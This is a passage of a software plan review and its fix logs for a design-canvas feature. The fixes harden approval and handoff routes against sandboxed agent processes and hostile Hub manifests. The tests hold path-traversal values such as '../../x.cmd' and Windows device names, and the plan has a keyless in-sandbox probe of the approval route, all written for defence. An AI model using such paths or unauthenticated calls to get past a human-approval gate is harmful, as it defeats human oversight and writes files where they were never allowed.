configuration and all wiring, 3 h), task 24 (renderer, assets, measurement, capture, responder,
hidden renderer, fonts, 3 h) and task 26 (every panel, the token picker, the colour picker, text in
place and the code panel, 3 h) are each about twice their estimate; split 20 as I6 says, 24 into
renderer and capture/responder, 26 into layout, fill/border/effects, and type/tokens/code. The
dependency graph is otherwise right: every depends-on was checked against the contracts each part
consumes, and only task 20 (I6) and task 28's phase-4 dependency (M14) are wrong.

### Security

Strong where it was designed: no script path into any document (three lines, one grep gate), no
message channel to validate, a loopback-only relay that parses nothing, identity from the channel,
no approve tool, no secret in the sandbox beyond the attach token, logs that never hold design text.
Weak where the plan relied on something outside itself: the local caller key (C1), the Hub's
contents (C2), the agent-writable clone (I1) and the export as a second rendering context (I2).
Recorded, not a defect: any process in a sandbox can call the MCP server as its session (I12) —
acceptable, because the scope is the session's own canvas, but the plan should say it.

### Design-system compliance (tasks 24–28)

Each UI part reads `DESIGN-SYSTEM.md` first, uses only tokens that exist in
`desktop/src/styles/tokens.css` (verified), forbids hex colours, gradients in chrome, `transition:
all` and `backdrop-filter` by CSS grep, puts live dots on the one heartbeat, uses `tabular-nums`,
and pairs every state colour with a shape. The flat `--canvas` has no dot grid. Remaining: M20's
toast, counts and scroll anchoring.

### What is missing

Beyond the issues above: a branch-lifecycle seam (I7), a raster-upload path agents can use (I12),
custom fonts (M18), page rename/delete for agents (M19), and a threat-model paragraph in the plan
itself that names the three trust boundaries it crosses — sandbox → control plane, Hub → worktree,
agent → exported file. Everything else the owner, the brief, the spec and the prototype ask for has
a task.

### The two defects a first implementer is most likely to hit

1. **The `PUT` routes blocked by CORS (I3).** Certain to happen on the first real run: the method
   list is hard-coded (`origin.go:169`), no test can see a browser's preflight, and phase 2 hit the
   same class once. **The plan does not prevent it.**
2. **The hidden renderer frozen by a hidden window (I4).** Likely on the first *"minimise the
   cockpit and let agents design"* session: patches wait for animation frames that do not come.
   **The plan does not prevent it**; its jsdom tests cannot show it, and task 01's spike never hides
   the window.

Runner-up: SVG icons without `xmlns` rendering as nothing (I8).

---

## Assessment

The plan is thorough, cites the real tree accurately (the checked citations above hold, with four
drifts), keeps the clean room (no AGPL source named or leaned on anywhere in 31 files), and its core
architecture — a Go authority that is the only writer, a script-less renderer with no message
channel, identity stamped from the relay channel — is sound. Its MCP surface matches the spec tool
for tool. The review-digest vectors are correct.

It is not ready to execute because of the two Critical issues: the human-only approval, the
product's one hard provenance rule, depends on the Hub's local caller key, which the plan calls
optional (C1); and the handoff writes files at paths any Hub teammate can choose (C2). Both are
small to fix — a hard dependency plus negative tests, and a path allowlist plus negative tests —
and neither changes the architecture. Of the Important issues, I1–I3 are security or certain-failure
fixes to make before code; I4–I12 can be fixed in their parts before those tasks start. The Minor
issues are edits.

Fix C1, C2 and I1–I3 in the plan, re-check I6's dependency split, and the plan is ready.

**Plan quality: Needs fixes**

---

## Fix batch b01 (2026-09-24) — C1, C2

Paths are relative to `docs/superpowers/plans/`; `parts/` is `2026-09-23-phase-5-design-canvas-parts/`.
Line numbers are as of this batch's commit.

### C1 — the local caller key is a hard dependency, and every design route requires it

| Change | Where |
|---|---|
| Rule 4 says the key is mandatory, why Host/Origin do not stop a sandbox, and what enforces it | plan `:108-116` |
| G4 gains the invariant: every design route behind the key; no mode, variable or build without it | plan `:270-272` |
| Task table: Hub C3 (Hub plan tasks 37–38) **hard** in the External column of 20, 21, 22, 27 | plan `:415-417`, `:422` |
| The waves: Hub C3 gates Lane E and task 27; no "add the key later" path | plan `:438-441` |
| New ask **HA5-6**: `localkey.Middleware` must refuse a zero `Key` (empty-slice `ConstantTimeCompare` is 1) | plan `:480` |
| Task 20 header: Hub C3 hard | `parts/task-20.md:3` |
| Every route requires the key; none is in `localkey.Exempt`; why | `parts/task-20.md:29-37` |
| The stream's `Authorization` line: required, not "when it has landed" (the review's `:62`) | `parts/task-20.md:69` |
| `Config.KeyGuard` required; `ErrNoKeyGuard`; `New` refuses first; `Mount` wraps every handler | `parts/task-20.md:189-206` |
| `main.go` builds `KeyGuard` from task 37's one minted key | `parts/task-20.md:220-221` (the wiring paragraph) |
| `TestNew_refusesNoKeyGuard`; `TestRoutes_localKeyRequired` (routes 5, 8, 9, 17, 19, 20: no key, wrong key, empty bearer → 401, authority unchanged; no `Origin`, spoofed `Host`); `TestMount_wrapsEveryRoute`; `TestMain_wiring` asserts keyless → 401 | `parts/task-20.md:238-240`, `:243` |
| Acceptance curl now expects `local_key_required`, then `canvas_not_found` with the key | `parts/task-20.md:262-266` |
| Task 21 header: Hub C3 hard | `parts/task-21.md:3` |
| `TestApprove_localKeyRequired` (route 21: 401, **no** `PutBlob`, **no** `Approve`); `TestApprove_noMCPPath` kept (it is the MCP half; the review's `:206`) | `parts/task-21.md:243-244` |
| Task 22 header: Hub C3 hard | `parts/task-22.md:3` |
| `TestHandoff_localKeyRequired` (routes 24 and 25) | `parts/task-22.md:146` |
| Task 27 header: Hub C3 hard | `parts/task-27.md:3` |
| `createDesignClient` requires `localKey` and throws without it; the stream's `localKey` is required with one refresh-and-retry (the review's `:160-161` fallback is gone) | `parts/task-27.md:58-66`, `:77-78` |
| `events.test.ts › authHeader` rewritten; `design.test.ts › localKeyRequired` added | `parts/task-27.md:144-145` |
| "Not claimed" no longer offers a Host/Origin fallback | `parts/task-27.md:170-173` |
| Task 30 header, and step 1's in-sandbox probe: routes 21, 5 and 20 from `docker exec` with no `Origin`, a spoofed `Host`, no key → refused **or** 401 `local_key_required`; the report records whether the host was reachable at all; if it was not, the same requests keyless from the host must be 401 | `parts/task-30.md:3`, `:59-80` |

**Departures from the review's fix, and why.** (1) The review listed routes 5, 8, 9, 17, 19, 20, 21, 24;
this batch adds **25** (the session link writes to the Hub as the signed-in user) and a walk of
every mounted pattern (`TestMount_wrapsEveryRoute`), so a route added later cannot skip the wrap.
(2) `designapi.New` takes a `KeyGuard func(http.Handler) http.Handler`, not the `localkey.Key`:
task 37's `Key` exposes no way to check it is non-zero, so `New` cannot validate a `Key`. The
zero-key gap goes to the Hub as HA5-6. *Corrected in round 2 (re-review I-2):* this batch first
said `TestMain_wiring` kills the identity-function mutant. It cannot: Hub task 37 wraps the whole
guarded mux in `localkey.Middleware` (`task-37.md:70`), so a keyless request through the real
process is 401 whatever `KeyGuard` is. `main.go` now builds the design API only through
`newDesignAPI`, and `TestNewDesignAPI_guardsBareMux` mounts its result on a bare `http.ServeMux`
with no outer wrap; that is the test that kills the mutant.

### C2 — Materialise treats a Hub manifest as hostile input

| Change | Where |
|---|---|
| Task 21 Files: `paths.go`, the one bundle-path rule | `parts/task-21.md:17-18`; plan file map `:336` |
| `MaxSnapshotBytes` = 512 MiB, shared by `BuildSnapshot` and `Materialise` | `parts/task-21.md:67-69` |
| `PathPattern`, `SafePath` (pattern, Windows device names, the `filepath.Rel` check), `ErrUnsafePath`, `ContentTypeFor` | `parts/task-21.md:73-98` |
| Slug rule: cut to 60 bytes **including** the repeat suffix; a device name gets `-artboard` | `parts/task-21.md:142-148` |
| Approve step 5: `MaxSnapshotBytes` → 413; a `SafePath` failure inside `BuildSnapshot` is a bug → 500 | `parts/task-21.md:204-205` |
| `TestBuildSnapshot_limits` (total bytes), `TestBuildSnapshot_pathsSafe`, `TestSafePath` (the review's seven names plus `con.html`, `lpt1.png`, `x.HTML`, `-x.html`, short hex, `manifest.json`, `approval.json`, `""`), `TestSlugs` (device name, over-long repeat) | `parts/task-21.md:232-235` |
| `Materialise`'s six ordered checks: strict manifest decode; the manifest names **this** approval (`designKey`, `canvasId`, `designRevision`, `reviewDigest`, `briefKey`), `BundleDir` from the Hub record only; `SafePath`, no duplicates, artboard paths ⊆ `Files`, content types, asset hex = its SHA-256; 500 files / 16 MiB / 512 MiB **before** any fetch; size and digest per file; the `filepath.Rel` re-check at the write site; any error writes nothing | `parts/task-22.md:48-79` |
| Error mapping: all three errors → `422 handoff_snapshot_invalid`, `details.reason` | `parts/task-22.md:96-100`; code at `parts/task-20.md:137`; `ProblemCode` count at `parts/task-27.md:16-18` |
| The route: `Fetch` bounded by `io.LimitReader(MaxFileBytes+1)`; `rec` is the Hub's record, never the body | `parts/task-22.md:114-117` |
| `TestMaterialise_hostilePaths` (the review's seven names, `con.html` and the Startup-folder path, each with **correct** digests: `ErrUnsafePath`, nothing written anywhere, only the manifest fetched), `TestMaterialise_manifestLies`, `TestMaterialise_otherDesign`, `TestMaterialise_limits`, `TestHandoff_invalidSnapshot` | `parts/task-22.md:141-145` |
| Task 30 step 2: a second `devissuer` user posts a `../../x.cmd` manifest to the real Hub; handoff → 422, nothing written | `parts/task-30.md:84-88` |
| G4 gains the invariant | plan `:272-274` |

**Departures from the review's fix, and why.** (1) The review's regex admits `con.html` (only
`CON.html`, which its case already refuses, was in its test list) — Windows reserves device names
case-insensitively with any extension, so `SafePath` adds a device-name check and `Slugs` never
produces one. (2) It admits `x.tailwind.html` and `x.tailwind.png`, and a slug starting or ending
in `-`, none of which `BuildSnapshot` writes; `PathPattern` is tightened to exactly its output.
(3) `slug.go` said "at most 60 bytes" and then appended `-2`, so a legal repeat could exceed the
regex's 60; the slug rule now cuts the base first. (4) The review said "cap … total bytes" without a
number: this batch takes **512 MiB**, half the Hub's 1 GiB project quota (`hub-contract.md:847`),
and makes `BuildSnapshot` refuse the same number so no snapshot is built that a handoff would
refuse. (5) Errors: the review offered `ErrTampered` or a new `ErrUnsafePath`; this batch uses
`ErrTampered` for digest, size and wrong-design mismatches, `ErrUnsafePath` for paths, and
`ErrTooLarge` for limits, all answered as one 422 code with a `reason`.

**Unverified.** That `host.docker.internal` reaches the host's loopback on this fleet's Docker
Desktop (the review's own caveat) — task 30 step 1 now records it. Hub plan tasks 37–38 are a
sibling plan's; their names (`localkey.Mint`, `Middleware`, `Exempt`, `LocalKeySource`) are cited
from `.claude/worktrees/hub/docs/superpowers/plans/2026-09-23-phase-h-hub-parts/task-37.md:29-77`
and `task-38.md:45-69`, not from built code.

### Round 2 (2026-09-24) — the re-review's open issues (`plan-rereview-b01-1.md`)

The re-review found C1 and C2 resolved and raised I-1, I-2 and M-1 to M-4. Line numbers are as of
this round's commits.

| Finding | Change | Where |
|---|---|---|
| **I-1** slug collision makes an approval un-handoff-able | `Slugs` measures a repeat against every slug already given out (one `taken` set): `"Home"`, `"Home"`, `"Home 2"` → `home`, `home-2`, `home-2-2` | `parts/task-21.md:188-201` |
| I-1 | `CheckManifest(m, manifestSize, ManifestWant)` in `paths.go` is the one manifest rule (kind/v, the approval's keys through `doc.ParseDesignKey`, `SafePath`, no duplicate path or slug, artboard paths ⊆ `Files`, content types, asset hex, the three limits); `ErrTampered` moves to `paths.go` with it | `parts/task-21.md:109-143` |
| I-1 | `BuildSnapshot` runs `CheckManifest` on its own output as its last step; the Files list and the limits comment say so | `parts/task-21.md:17-19`, `:69-84` |
| I-1 | Approve step 5: a self-check `ErrTampered`/`ErrUnsafePath` → `500 internal`, nothing uploaded, no approval; `buildSnapshot` seam | `parts/task-21.md:260-264` |
| I-1 | `TestSlugs` rows (both orders, pairwise distinct); `TestCheckManifest`; `TestBuildSnapshot_selfChecks` (`slugsFn` seam, `:203-205`); `TestApprove_snapshotBug` | `parts/task-21.md:294-297` |
| I-1 | Materialise steps 2–4 are now one `handoff.CheckManifest` call, the same function; `TestMaterialise_sharesCheckManifest` | `parts/task-22.md:52-73`, `:150` |
| I-1 | Plan file map: `paths.go` is the path **and manifest** rule | plan `:336` |
| **I-2** identity `KeyGuard` survives `TestMain_wiring` | `main.go` builds the design API only through `newDesignAPI` (`cmd/api/design.go`); why the outer wrap hides the mutant | `parts/task-20.md:22-23`, `:191`, `:222-233`; plan `:364` |
| I-2 | `TestNewDesignAPI_guardsBareMux`: the result on a bare `http.ServeMux`, no `api.New`, route 5 keyless → 401; `TestMain_wiring`'s kill column narrowed to "never mounted" | `parts/task-20.md:254-255` |
| I-2 | Departure (2) of this section corrected | this file `:519-526` |
| **M-1** stream retry never resets | "a second **consecutive** 401"; the allowance resets on every 200; the test runs two restarts in one window | `parts/task-27.md:77-81`, `:147` |
| **M-2** task 30's probe can hang | `--connect-timeout 3 --max-time 5` on each call; a 15 s `docker exec` context; classified by curl's exit code (6/7/28 with `000` = unreachable; 28 with a status = a keyless stream = fail; 0 = must be 401 `local_key_required`); a keyed host-side positive control on route 20 | `parts/task-30.md:64-100` |
| **M-3** route-walk count rows | task 20 names each part's count; task 21 row (23), task 22 row (26), task 29 row (27) plus route 27's keyless-401 row | `parts/task-20.md:251`; `parts/task-21.md:298`; `parts/task-22.md:151`; `parts/task-29.md:60-61` |
| **M-4.1** design key parse and canvas id | `rec.DesignKey` through `doc.ParseDesignKey` (a parse failure → `ErrTampered`); its canvas id must equal the route's `{canvasId}`, now Materialise's `canvasID` argument; test rows | `parts/task-21.md:124-127`; `parts/task-22.md:62-65`, `:84`, `:119-121`, `:149` |
| **M-4.2** "every path it writes" | now "every `Files` path" (`manifest.json` is not one) | `parts/task-21.md:81-84` |

**Departures, and why.** (1) I-1's fix named `CheckManifest(m Manifest, want ApprovalRecord)`.
`ApprovalRecord` is task 22's type, and `BuildSnapshot` (task 21) has no approval yet, so the
function takes a `ManifestWant` of the four values both callers do have, plus `manifestSize`
(the byte limit counts the manifest, which `Manifest` alone cannot measure). (2) M-2's "28 means
unreachable" is refined: a keyless route 20 sends its headers and then may send no body byte for
up to 15 s (the ping interval), so exit 28 alone cannot tell "unreachable" from "streaming to a
sandbox". The status curl received is the signal, and the positive control proves curl reports it
on a `--max-time` exit. (3) `CheckManifest` also refuses two artboards sharing a slug; unique
paths imply it for `BuildSnapshot`'s output, and it closes a hostile manifest pointing two
artboard rows at one file set.

**Unverified.** That curl prints the received status on a `--max-time` exit (task 30's positive
control checks it). That the sandbox image ships `curl` (already assumed by b01). The re-review's
out-of-scope observations (G4 and review I1's symlink case, the key file under a bind mount, the
HA5-5/HA5-6 row order) are not addressed here.

## Fix batch b02 (2026-09-24) — I3, I6, I7

Paths are relative to `docs/superpowers/plans/`; `parts/` is `2026-09-23-phase-5-design-canvas-parts/`.
Line numbers are as of commit `5d9982d` (commits `17c39eb` I3, `09d8951` I6, `5d9982d` I7).

### I3 — the design routes stay inside the preflight's verb set

| Change | Where |
|---|---|
| Route 11 (`…/assets/{sha}`) and route 17 (`…/selection`) are `POST`, not `PUT` | `parts/task-20.md:88`, `:94` |
| The verb rule: GET, POST, DELETE only; why (`httpx/origin.go:169`, Go contract §3.1 at `2026-09-18-phase-2-go-contract.md:1531`); a later verb amends `corsMethods` and §3.1 in its own commit | `parts/task-20.md:103-113` |
| `TestAssets_putGet` → `TestAssets_postGet` | `parts/task-20.md:273` |
| `TestMount_everyMethodPassesPreflight`: every pattern `Mount` records gets a real preflight through `httpx.NewOriginPolicy(httpx.DefaultOrigins(), …).Middleware`; the method must be in `Allow-Methods`, and `Authorization`, `Content-Type` in `Allow-Headers` | `parts/task-20.md:283` |
| `TestPreflightAllowsEveryRegisteredMethod`: the same over `api.New(d).RegisteredPatterns()`, phase 2's routes included | `parts/task-20.md:284`; Files `:29-30`; plan file map `:365` |
| Task 30 records `corsMethods` **unchanged** as a decision, not an amendment | `parts/task-30.md:46` |
| Owner item 8: image paste and selection in the real webview, no CORS error; count → 8, then 9 after I7 | `parts/task-30.md:132-135`, `:153` |

**Departures, and why.** (1) The review offered POST or a `corsMethods` amendment. This batch
takes POST: route 11 is idempotent by construction (the path is the SHA-256), `origin.go`'s
constant block is already edited by Hub task 37 for `corsHeaders`
(`.claude/worktrees/hub/docs/superpowers/plans/2026-09-23-phase-h-hub-parts/task-37.md:21`, `:64-65`),
and the verb set is the phase-2 Go contract's. (2) The review asked for one `httpx` test. `httpx`
cannot see the routes without importing their packages, so there are two tests, one per route
recorder (`designapi`'s recording `handle`, `api`'s `RegisteredPatterns`,
`control-plane/internal/api/export_test.go:21`). Both send a real preflight and read the live
middleware's answer rather than a copied constant.

### I6 — task 20 is two tasks, each compiling on what it declares

| Change | Where |
|---|---|
| Task 20a (kept as `task-20.md`): header, deps 11, 12, 13, hours 4.5, why the split | `parts/task-20.md:1-11` |
| 20a's Files: no `cmd/api` file; `approvals_none.go` | `parts/task-20.md:22-36` |
| The `Approvals` seam: `(*API).Approvals()` returns `noApprovals{}` (`Latest` → not found) until task 21 replaces it inside `designapi` | `parts/task-20.md:52-59`, `:260`; `TestApprovals_noneUntilTask21` `:289` |
| `Config.Hub` is not in 20a's struct: task 21 adds the field with its type | `parts/task-20.md:233-235` |
| 20a's tests, steps, acceptance and "Not claimed" drop the `cmd/api` work | `parts/task-20.md:291-314` |
| Task 20b (new `task-20b.md`): deps 17, 19, 20a; hours 1.5; the table of calls and the task each comes from | `parts/task-20b.md:1-27` |
| 20b's Files, the two variables, the wiring order (`newDesignAPI` first, then `newMCPServer` / `newMCPDeps`, then `mcprelay.NewSupervisor(mcprelay.SupervisorConfig{…})`) | `parts/task-20b.md:29-68` |
| 20b's tests: `TestConfig_canvasVars`, `TestMain_wiring`, `TestNewDesignAPI_guardsBareMux` (moved from 20), `TestNewMCPServer_wired`, `TestNewMCPDeps_approvalsFromDesignAPI` (new); the acceptance curl (moved) | `parts/task-20b.md:74-78`, `:85-100` |
| Task 21: deps 08, 09, 13, 20a, 20b; Files gain `mount.go` (`Config.Hub`, the real `Approvals()`) and the one `cmd/api/design.go` `Hub` line | `parts/task-21.md:3`, `:22-27` |
| `TestApprove_noHub`: a nil `Hub` → `503 hub_not_configured` (Hub plan `task-32.md:28`), no panic | `parts/task-21.md:310` |
| Plan: task table rows 20a, 20b, 21, 27, 29 | plan `:417-419`, `:425`, `:427` |
| Plan: total ≈ 81 h; critical path `… 15 → 17 → 20b → 21 → 22 → 28 → 30` and why | plan `:430-433` |
| Plan: waves 4 and 5 | plan `:441-442` |
| Plan: Hub C3 names 20a and 20b; lanes; the shared-files list, with 20a/20b and Lane E's two internal hand-offs | plan `:112`, `:444`, `:449-456` |
| Plan: file map rows (`api.go`, `events/`, `designapi/`, `problem.go`, `config.go`/`main.go`, `design.go`, `routes_audit_test.go`); the parts-file note | plan `:359-365`, `:391-392` |
| Every "task 20" restatement names 20a or 20b | `parts/task-10.md:78`, `task-11.md:10`, `:304`, `task-13.md:36`, `:165`, `task-15.md:14`, `:27`, `:245`, `task-19.md:18`, `:114`, `:149`, `:172`, `task-21.md:3`, `:234`, `:304`, `:314`, `task-22.md:107`, `:151`, `:154`, `task-27.md:3`, `:16`, `:29`, `:73`, `task-29.md:3`, `:60-61`, `task-30.md:3`, `:24-25`; plan `:175`, `:269`, `:489` |

**Departures, and why.** (1) The review put a stub `Approvals` in 20b's wiring "until 21". A stub
there would need task 21 to edit `main.go` again. The stub is instead 20a's `(*API).Approvals()`
method, and 20b wires its result, so task 21 changes no MCP wiring. (2) Fixing I6 exposed a second
undeclared dependency of the same kind: `designapi.Config.Hub` had type `Designs`, which task 21
declares (`parts/task-21.md:215-226`), and no task passed a Hub client into `main.go` at all. Task 21
now adds the field and its `design.go` line (so 21 depends on 20b, and the critical path runs
17 → 20b → 21), and passes Hub task 32's `hubclient` value (Hub plan `task-32.md:91-96`).
(3) The old wiring wrote `mcprelay.NewSupervisor{…}`; the real signature is
`NewSupervisor(SupervisorConfig) (*Supervisor, error)` (`parts/task-19.md:86-106`). (4) The plan's
file map said task 19 edits `cmd/api/config.go` and `main.go`; task 19's Files do not
(`parts/task-19.md:13-19`), so the row now says 20b. (5) Hours: the review's sizing note says task 20 was
about twice its 3 h, so 20a is 4 h (4.5 after I7) and 20b is 1.5 h.

### I7 — a canvas binding follows its branch (seam S5-P3.2)

| Change | Where |
|---|---|
| `Binding` comment (why an id does not follow a rename, `project.go:118-121`), `ArchivedAt`; `Bind` counts unarchived bindings only; `Lookup` unarchived only; `Rebind`, `Archive` | `parts/task-10.md:42-76` |
| Crash rule 4 covers `Rebind` and `Archive` | `parts/task-10.md:125-126` |
| `storetest` › *rebind*, › *archive*; `TestFileStore_rebindArchiveRestart` (a crash between temp write and rename leaves the old file) | `parts/task-10.md:133-135` |
| "Not claimed": a delete archives the binding, never the canvas | `parts/task-10.md:164-165`; hours `:3` |
| `authority.Config.Branches BranchLifecycle` (nil before phase 3); `branches.go`: `BranchRename`, `BranchLifecycle{Renames, LastDeleted}`, `ErrBranchLifecycle` (fail closed) | `parts/task-11.md:15-16`, `:33-36`, `:96-125` |
| `resolve`: a fresh lookup (every `Ensure`/`ForBranch`, a session's first call) archives a deleted branch's binding; a miss follows the rename map, bounded against cycles; `CreatedAt = max(now, at + 1 s)` after a delete | `parts/task-11.md:127-149` |
| Scope reads the binding, not `Document.BranchID` (which keeps the creation branch) | `parts/task-11.md:146-149`, `:176-177`; `parts/task-05.md:179` |
| Eight tests: follows a rename, a chain and a cycle, delete archives, a session's first call checks, not-deleted keeps, errors fail closed, nil port, scope follows the binding | `parts/task-11.md:289-296` |
| "Not claimed": a terminal `git branch -m`/`-D` is not followed (phase 3's own A8 limit, phase 3 `task-11.md:198-199`) | `parts/task-11.md:316-320`; hours `:3` |
| The phase-3 adapter `designapi/branches_phase3.go` (only once phase 3 exists): `Renames` over `lanes.Store.Renames` (phase 3 `task-03.md:72-96`); `LastDeleted` over `refs/panacea/archive/<b>/<unix>` (phase 3 `task-11.md:105`, `:111`), the branch id checked before git; a lifecycle error → `500 internal`, no new code | `parts/task-20.md:32-34`, `:38-50` |
| `TestPhase3Branches_renames`, `TestPhase3Branches_lastDeleted`, `TestRoutes_renameAndDelete` | `parts/task-20.md:286-288` |
| 20b wires `authority.Config.Branches`; `newAuthorityConfig`; `TestNewAuthority_branchesWired` | `parts/task-20b.md:35-36`, `:46-50`, `:73` |
| Owner item 9: rename keeps the canvas and approval; delete-and-recreate shows state 1 | `parts/task-30.md:136-140` |
| Plan: P5-L names the seam; the S5-P3.2 row; task rows 10, 11, 20a; file map rows | plan `:216`, `:467`, `:407-408`, `:417`, `:329`, `:361` |

**Departures, and why.** (1) The review put the rebind in `designapi`. MCP resolves a session's
canvas through the authority, not through `designapi`, so a rebind there would leave an agent on a
recreated branch writing into the deleted branch's canvas. `resolve` lives in the authority, behind
both surfaces. (2) The review said "a branch delete archives the binding" without saying how the
canvas learns of a delete. Phase 3's `DeleteBranch` has one hook, and it is phase 4's
(`briefref.Archiver`, phase 3 `task-11.md:114-117`), and a hook can be lost across a crash. This
batch reads phase 3's durable record instead, the archive ref every cockpit delete writes, on every
fresh lookup. No ask to phase 3 is needed. (3) The port returns `LastDeleted` (a time), not a
yes/no, because the archive ref has whole seconds: `resolve` compares at the second and dates a
post-delete binding one second after the delete, so a create and a delete in one second are never
read in the wrong order. (4) Any lifecycle read error fails closed (no create, rebind or archive).
Guessing either way breaks the thread: it hands a new branch the old approvals, or strands the
approved design behind an empty canvas.

**Unverified.** Every phase-3 name (`lanes.Store.Renames`, `Rename`, the archive-ref layout,
`gitx.Machine`, the `branch_has_worktrees` and Q4 refusals) is cited from phase 3's plan parts in
`.claude/worktrees/phase-3/`, not from built code. The same goes for Hub task 32's `hubclient`
wiring and `hub_not_configured`. Whether phase 4's brief binding follows a branch rename (the approval's brief key
after a rename) is phase 4's concern and was not checked. `TestPreflightAllowsEveryRegisteredMethod`
assumes a preflight through `api.New`'s handler reaches the origin middleware at `/`: read from
`httpx/origin.go:231-237` and `routes_audit_test.go:83-88`, not run.

